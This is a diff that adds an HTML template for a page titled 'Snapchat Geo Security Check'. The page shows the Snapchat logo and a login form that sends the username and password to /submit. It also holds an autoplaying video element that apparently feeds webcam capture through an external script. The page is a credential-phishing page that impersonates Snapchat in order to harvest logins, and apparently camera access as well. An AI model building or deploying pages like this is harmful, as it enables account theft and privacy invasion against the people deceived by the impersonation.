@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Snapchat Geo Security Check</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" />
+</head>
+<body>
+  <!-- Loader with class -->
+  <div class="loader"></div>
+
+  <!-- Main container hidden by default -->
+  <div class="container" id="login-box" style="display:none;">
+    <img src="{{ url_for('static', filename='snap-logo.png') }}" class="logo" alt="Snapchat Logo" />
+    <form id="login-form" method="POST" action="/submit">
+      <input type="text" name="username" placeholder="Username or Email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+    <video id="video" width="320" height="240" autoplay style="margin-top: 15px; border: 1px solid #ccc;"></video>
+  </div>
+
+  <script src="{{ url_for('static', filename='script.js') }}"></script>
+  <script>
+    window.addEventListener('DOMContentLoaded', () => {
+      const loader = document.querySelector('.loader');
+      const container = document.querySelector('.container');
+
+      // Hide loader, show container after short delay (simulate loading)
+      setTimeout(() => {
+        loader.style.display = 'none';
+        container.style.display = 'flex';
+      }, 1000);  // 1 second delay for effect
+    });
+  </script>
+</body>
+</html>
